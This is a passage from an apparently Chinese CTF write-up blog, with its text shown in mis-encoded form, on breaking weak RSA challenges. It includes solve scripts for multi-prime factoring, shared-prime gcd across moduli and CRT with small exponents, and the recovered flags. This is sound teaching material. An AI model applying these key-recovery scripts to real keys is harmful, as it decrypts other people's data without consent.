abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">3454083680130687060405946528826790951695785465926614724373</span><br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">1347530713288996422676156069761604101177635382955634367208</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-2"><a class="markdownIt-Anchor" href="#åˆ†æ-2"></a> åˆ†æ</h2><p>ç»™äº†n,e,c</p><p>å¯ä»¥ç›´æ¥åˆ†è§£n,å¾—åˆ°ä¸‰ä¸ªå› æ•°,è®°ä¸ºp,q,r</p><p>å¯ä»¥å‘ç°ç›´æ¥è®¡ç®—phi_næ˜¯è·Ÿnä¸äº’ç´ çš„ï¼Œæ— æ³•æ±‚è§£dï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±åˆ©ç”¨nçš„å› å­ï¼Œä¹Ÿæ˜¯å¯ä»¥æ±‚è§£çš„ï¼Œå…·ä½“åŸç†è·Ÿç”¨nè§£å¯†æ˜¯ä¸€æ ·çš„è¿‡ç¨‹ï¼Œåˆ©ç”¨è´¹é©¬å°å®šç†ã€‚</p><p>è¿™é‡Œçœ‹p,q,rçš„æ¬§æ‹‰å‡½æ•°è·Ÿeå“ªä¸ªæ˜¯äº’ç´ ï¼Œå¯ä»¥å‘ç°p,rå’Œeäº’ç´ çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å°±è®¡ç®—p*rçš„æ¬§æ‹‰å‡½æ•°è·Ÿeè¿›è¡Œæ±‚è§£dï¼Œç„¶åå°±æ˜¯æ­£å¸¸çš„rsaè§£å¯†</p><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> factordb.factordb <span class="hljs-keyword">import</span> FactorDB<br>n = <span class="hljs-number">3454083680130687060405946528826790951695785465926614724373</span><br>f=FactorDB(n)<br>f.connect()<br>p,q,r=f.get_factor_list()<br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">1347530713288996422676156069761604101177635382955634367208</span><br><br><span class="hljs-built_in">print</span>(gcd(e,p-<span class="hljs-number">1</span>)) <span class="hljs-comment">#1</span><br><span class="hljs-built_in">print</span>(gcd(e,q-<span class="hljs-number">1</span>)) <span class="hljs-comment">#3</span><br><span class="hljs-built_in">print</span>(gcd(e,r-<span class="hljs-number">1</span>)) <span class="hljs-comment">#1</span><br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)),p*r)))<br></code></pre></td></tr></table></figure><h1 id="ç¾ŠåŸæ¯-2021bigrsa"><a class="markdownIt-Anchor" href="#ç¾ŠåŸæ¯-2021bigrsa"></a> [ç¾ŠåŸæ¯ 2021]Bigrsa</h1><h2 id="é¢˜ç›®-3"><a class="markdownIt-Anchor" href="#é¢˜ç›®-3"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> *<br><br>n1 = <span class="hljs-number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span><br>n2 = <span class="hljs-number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span><br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n1)<br>c = <span class="hljs-built_in">pow</span>(c, e, n2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = %d&quot;</span> % c)<br><br><span class="hljs-comment"># output</span><br><span class="hljs-comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-3"><a class="markdownIt-Anchor" href="#åˆ†æ-3"></a> åˆ†æ</h2><p>ç»™äº†æˆ‘ä»¬ä¸¤ä¸ªnï¼Œä¸€èˆ¬è¿™ç§æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“æ˜¯å…¬ç”¨ç´ æ•°é—®é¢˜äº†ï¼Œæ±‚è§£n1å’Œn2çš„å…¬çº¦æ•°å°±å¯ä»¥æ±‚è§£å‡ºä¸€ä¸ªç´ æ•°</p><p>ç„¶åcæ˜¯ç»è¿‡äº†ä¸¤æ¬¡rsaåŠ å¯†ï¼Œæ±‚è§£ä¸¤æ¬¡å°±å¥½äº†</p><h2 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;from Crypto.Util.number import *</span><br><span class="hljs-string">from flag import *</span><br><span class="hljs-string"></span><br><span class="hljs-string">n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span><br><span class="hljs-string">n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">m = bytes_to_long(flag)</span><br><span class="hljs-string">c = pow(m, e, n1)</span><br><span class="hljs-string">c = pow(c, e, n2)</span><br><span class="hljs-string"></span><br><span class="hljs-string">print(&quot;c = %d&quot; % c)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># output</span><br><span class="hljs-string"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span><br>n2 = <span class="hljs-number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><br>p=gcd(n1,n2)<br><br><span class="hljs-keyword">if</span> p != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> isPrime(p):<br>    c1=<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(n2//p-<span class="hljs-number">1</span>)),n2)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c1,invert(e,(p-<span class="hljs-number">1</span>)*(n1//p-<span class="hljs-number">1</span>)),n1)))<br><span class="hljs-comment">#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;</span><br><br></code></pre></td></tr></table></figure><h1 id="é—½ç›¾æ¯-2021decode"><a class="markdownIt-Anchor" href="#é—½ç›¾æ¯-2021decode"></a> [é—½ç›¾æ¯ 2021]decode</h1><h2 id="é¢˜ç›®-4"><a class="markdownIt-Anchor" href="#é¢˜ç›®-4"></a> é¢˜ç›®</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">n1:</span><br><span class="hljs-number">15228664629164509105936278301396170708905691970126305196584505186788860519598413718493859625462561931380632032431490419378905593909771649295663481782473029836321132574188559245931660756414915507930357509270674460219615256962333464689419869130366867401404262606367700782040693275068101244535880649261286041921882470460606034302142183971677715439862839410834231609821777031530457674591868138859358815039755085358568037032478394036448363183057305077227769673701227083943898736796552550712057417053897722979700329662099072959306298177351997084389916443815546425080826441671985030755256185725913397986385179516049927425591</span><br><span class="hljs-symbol">n2:</span><br><span class="hljs-number">28182418532443955655250943929828439725377604572088962537896240628709829618999901367131159759359513146864646169253348651905865895468151210748207509325666501438590382812326109260537618829438786609626137074778638549998280533912080708785604673270460635181275360847313985764185991865570533815651261638439461846512012164531330949433517277559149828806588070421852157781670188281908625986974579194819272643409859915715455134433970119584552350648013116998668938513347083566970423327936691885137812528912263666957628197241313496232397910546498542303925205356813548741679943691886217742767778075067797422624969714343428365022749</span><br><span class="hljs-symbol">n3:</span><br><span class="hljs-number">18355811159408154065817199279776805621878757240392366715869421799780946779485225342662736231980532326015283372375030686507311099745671828649419794838611580909610100636296701054995302819692794479292794716441442731393027118795245239019609474743841061251498233337758043553376098591254587406941205804917663153256036922860462415387926973551020540123742773938055950168965005226319984869124543783579240130888344231027912143592472823564266887957101575622993773291455143915263715932280728961208233983782906070719786115187115449430196335973764600533097718947377609348244073036523422892353195107093782201003551217830556519184839</span><br><span class="hljs-symbol">e1:</span><br><span class="hljs-number">65537</span><br><span class="hljs-symbol">e2:</span><br><span class="hljs-number">27751</span><br><span class="hljs-symbol">e3:</span><br><span class="hljs-number">65537</span><br><span class="hljs-symbol">c1:</span><br><span class="hljs-number">5368342382489380107251269030258282008067103595899117880173297169710980852124379736420135829984131832023988667774795223808420069001078159756328642298736759964890517323144475742861501409284299556459601222657540302786301791897975932176538612601162552795835603779910738886150925504885639254302406755008796950704938463132687940418772021406619622090999564746948113296328739593309200238996686945891130656599419832796482095787039339269564880847130379179831744694000940207887150388411084465949903406848727641093033681144598595895383689139227400553234701993087147186292040330589331703587405822925483701667354935313494938769206</span><br><span class="hljs-symbol">c2:</span><br><span class="hljs-number">21521672635651854919517759696514027081496995002884626306313384597771682621826437868933822942195279941318573525337109548152966094293276717095298929811895186384560362917891928656637913236676702009205642367801075592458101830488916914437754803979953027152373619293870115731171449223105986403604973873007338969000153480949617700626516389419935352576014084068271819009465242491467427642787306345049280205827574043586767133396458785487959251540831856187380154825027964867977651727983254127239427622549059938701125498520279503972702883327594442747467858234391945790597844344295786118320620376681461727686876948563884520137741</span><br><span class="hljs-symbol">c3:</span><br><span class="hljs-number">13940747781246179701167820858098775936269078279837839169409057305686612176371099274767269714494905207551971162649902129137425806839867713157472497469542260664882313041602553845621113546259276402534229231780532278276697961222319054833980226978574905974878218905613341365260453461080117407529132948986104191917111000811731784483944945364091757083949827612260904757837644538366763161154611658652020868326985526984718638276184626634240096213703958275241215175054246685206226179114590838833694648062135027841593419815101363262701960507235056752424778384286627997500871204804629047307688466887868894491042058198480775705486</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-4"><a class="markdownIt-Anchor" href="#åˆ†æ-4"></a> åˆ†æ</h2><p>è·Ÿä¸Šé¢˜ä¸€æ ·çš„æ€è·¯ï¼Œå…¬ç”¨ç´ æ•°é—®é¢˜</p><p>pè¶³å¤Ÿå¤§å°±ç›´æ¥ç”¨pè§£å¯†äº†</p><h2 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n1=<span class="hljs-number">15228664629164509105936278301396170708905691970126305196584505186788860519598413718493859625462561931380632032431490419378905593909771649295663481782473029836321132574188559245931660756414915507930357509270674460219615256962333464689419869130366867401404262606367700782040693275068101244535880649261286041921882470460606034302142183971677715439862839410834231609821777031530457674591868138859358815039755085358568037032478394036448363183057305077227769673701227083943898736796552550712057417053897722979700329662099072959306298177351997084389916443815546425080826441671985030755256185725913397986385179516049927425591</span><br>n2=<span class="hljs-number">28182418532443955655250943929828439725377604572088962537896240628709829618999901367131159759359513146864646169253348651905865895468151210748207509325666501438590382812326109260537618829438786609626137074778638549998280533912080708785604673270460635181275360847313985764185991865570533815651261638439461846512012164531330949433517277559149828806588070421852157781670188281908625986974579194819272643409859915715455134433970119584552350648013116998668938513347083566970423327936691885137812528912263666957628197241313496232397910546498542303925205356813548741679943691886217742767778075067797422624969714343428365022749</span><br>n3=<span class="hljs-number">18355811159408154065817199279776805621878757240392366715869421799780946779485225342662736231980532326015283372375030686507311099745671828649419794838611580909610100636296701054995302819692794479292794716441442731393027118795245239019609474743841061251498233337758043553376098591254587406941205804917663153256036922860462415387926973551020540123742773938055950168965005226319984869124543783579240130888344231027912143592472823564266887957101575622993773291455143915263715932280728961208233983782906070719786115187115449430196335973764600533097718947377609348244073036523422892353195107093782201003551217830556519184839</span><br>e1=<span class="hljs-number">65537</span><br>e2=<span class="hljs-number">27751</span><br>e3=<span class="hljs-number">65537</span><br>c1=<span class="hljs-number">5368342382489380107251269030258282008067103595899117880173297169710980852124379736420135829984131832023988667774795223808420069001078159756328642298736759964890517323144475742861501409284299556459601222657540302786301791897975932176538612601162552795835603779910738886150925504885639254302406755008796950704938463132687940418772021406619622090999564746948113296328739593309200238996686945891130656599419832796482095787039339269564880847130379179831744694000940207887150388411084465949903406848727641093033681144598595895383689139227400553234701993087147186292040330589331703587405822925483701667354935313494938769206</span><br>c2=<span class="hljs-number">21521672635651854919517759696514027081496995002884626306313384597771682621826437868933822942195279941318573525337109548152966094293276717095298929811895186384560362917891928656637913236676702009205642367801075592458101830488916914437754803979953027152373619293870115731171449223105986403604973873007338969000153480949617700626516389419935352576014084068271819009465242491467427642787306345049280205827574043586767133396458785487959251540831856187380154825027964867977651727983254127239427622549059938701125498520279503972702883327594442747467858234391945790597844344295786118320620376681461727686876948563884520137741</span><br>c3=<span class="hljs-number">13940747781246179701167820858098775936269078279837839169409057305686612176371099274767269714494905207551971162649902129137425806839867713157472497469542260664882313041602553845621113546259276402534229231780532278276697961222319054833980226978574905974878218905613341365260453461080117407529132948986104191917111000811731784483944945364091757083949827612260904757837644538366763161154611658652020868326985526984718638276184626634240096213703958275241215175054246685206226179114590838833694648062135027841593419815101363262701960507235056752424778384286627997500871204804629047307688466887868894491042058198480775705486</span><br><br>p1=gcd(n1,n2)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c1,invert(e1,p1-<span class="hljs-number">1</span>),p1)))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c2,invert(e2,p1-<span class="hljs-number">1</span>),p1)))<br><span class="hljs-comment">#b&quot;hahaha, you&#x27;ve got the flag didn&#x27;t you !the front part is :flag&#123;G00d_w4&quot;</span><br><span class="hljs-comment">#b&quot;hahaha, you&#x27;ve got the flag didn&#x27;t you !the middle part is :y_tO_cR&quot;</span><br>p3=gcd(n3,n2)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c3,invert(e3,p3-<span class="hljs-number">1</span>),p3)))<br><span class="hljs-comment">#b&quot;hahaha, you&#x27;ve got the flag didn&#x27;t you !the last part is :4ck_RS4&#125;&quot;</span><br><span class="hljs-comment">#flag&#123;G00d_w4y_tO_cR4ck_RS4&#125;</span><br><span class="hljs-comment">#NSSCTF&#123;G00d_w4y_tO_cR4ck_RS4&#125;</span><br></code></pre></td></tr></table></figure><h1 id="é¹¤åŸæ¯-2021crazy_rsa_tech"><a class="markdownIt-Anchor" href="#é¹¤åŸæ¯-2021crazy_rsa_tech"></a> [é¹¤åŸæ¯ 2021]Crazy_Rsa_Tech</h1><h2 id="é¢˜ç›®-5"><a class="markdownIt-Anchor" href="#é¢˜ç›®-5"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> *<br><br>FLAG = bytes_to_long(pad(<span class="hljs-string">b&quot;flag&#123;??????&#125;&quot;</span>,<span class="hljs-number">64</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_key</span>():<br>    p, q = getPrime(<span class="hljs-number">512</span>), getPrime(<span class="hljs-number">512</span>)<br>    n = p*q<br>    e = <span class="hljs-number">9</span><br>    <span class="hljs-keyword">while</span>(GCD((p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>),e)!=<span class="hljs-number">1</span>):<br>        p, q = getPrime(<span class="hljs-number">512</span>), getPrime(<span class="hljs-number">512</span>)<br>        n = p*q<br>    d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> n,e,d<br><br>n_list=<span class="hljs-built_in">list</span>()<br>c_list=<span class="hljs-built_in">list</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    N,e,d=init_key()<br>    n_list.append(N)<br>    c=<span class="hljs-built_in">pow</span>(FLAG,e,N)<br>    c_list.append(<span class="hljs-built_in">pow</span>(FLAG,e,N))<br>    <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">pow</span>(c,d,N)==FLAG)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n_list:&quot;</span>,n_list)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c_list:&quot;</span>,c_list)<br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">n_list: <span class="hljs-string">[71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799, 92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949, 100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919, 59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847, 66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147, 120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377, 72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281, 69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951, 76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581]</span><br>c_list: <span class="hljs-string">[62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585, 46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900, 85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198, 14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656, 1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839, 2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981, 16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376, 31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996, 25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515]</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-5"><a class="markdownIt-Anchor" href="#åˆ†æ-5"></a> åˆ†æ</h2><p>å¤šä¸ªnå¯¹ä¸€ä¸ªæ˜æ–‡è¿›è¡ŒåŠ å¯†ï¼Œè€Œä¸”eæ¯”è¾ƒå°ï¼Œå¯ä»¥ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚è§£ï¼Œæ±‚è§£å‡ºæ¥æ˜¯m<sup>e</sup>ï¼Œç„¶åå†å¼€æ ¹å°±å¥½äº†</p><p>ï¼ˆå¦å¤–å¦‚æœeæ¯”è¾ƒå¤§næ¯”è¾ƒå¤šï¼Œè¿˜æœ‰ä¸€ç§æ˜¯å¹¿æ’­æ”»å‡»ï¼Œä¹Ÿæ˜¯å…±ç”¨ç´ æ•°çš„ä¸€ç§ï¼Œç”¨O(n<sup>2</sup>)çš„æ—¶é—´å»åµŒå¥—éå†n_listï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å…¬ç”¨çš„ç´ æ•°ï¼‰</p><h2 id="exp-5"><a class="markdownIt-Anchor" href="#exp-5"></a> exp</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">from</span> gmpy2 import *<br><span class="hljs-attribute">from</span> sympy.ntheory.modular import crt<br><span class="hljs-attribute">n_list</span>=[<span class="hljs-number">71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799</span>, <span class="hljs-number">92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949</span>, <span class="hljs-number">100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919</span>, <span class="hljs-number">59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847</span>, <span class="hljs-number">66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147</span>, <span class="hljs-number">120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377</span>, <span class="hljs-number">72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281</span>, <span class="hljs-number">69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951</span>, <span class="hljs-number">76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581</span>]<br><span class="hljs-attribute">c_list</span>=[<span class="hljs-number">62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585</span>, <span 